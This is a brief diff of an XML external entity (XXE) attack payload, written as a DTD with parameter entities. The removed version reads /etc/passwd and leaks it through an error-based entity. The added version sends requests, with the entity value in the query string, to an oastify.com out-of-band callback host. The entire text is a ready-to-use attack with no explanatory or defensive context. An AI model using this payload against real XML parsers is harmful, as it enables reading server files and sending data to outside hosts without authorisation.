@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///tmp/%file;'>">
+<!ENTITY % file SYSTEM "http://2twof2x07cffnhflfv35dgzdz45vtnhc.oastify.com">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://2twof2x07cffnhflfv35dgzdz45vtnhc.oastify.com/?%file;'>">
 %eval;
 %error;
